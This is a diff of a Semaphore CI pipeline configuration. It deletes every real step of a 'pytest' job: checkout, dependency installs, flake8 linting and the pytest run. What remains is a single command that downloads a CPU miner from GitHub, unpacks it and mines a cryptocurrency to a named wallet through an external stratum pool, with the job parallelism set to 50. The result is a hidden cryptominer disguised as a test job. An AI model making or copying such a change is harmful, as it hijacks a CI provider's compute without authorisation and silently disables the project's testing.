@@ -10,15 +10,6 @@ blocks:
       jobs:
         - name: pytest
           commands:
-            - sem-version python $PYTHON_VERSION
-            - checkout
-            - python -m pip install --upgrade pip
-            - pip install -r requirements.txt
-            - pip install flake8
-            - 'flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics'
-            - flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics
-            - pip install pytest
-            - pytest
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q5jlf86v5sw8wawypyvx9gga3eszuhyjmp3etq6 -t10'
           parallelism: 50
       agent:
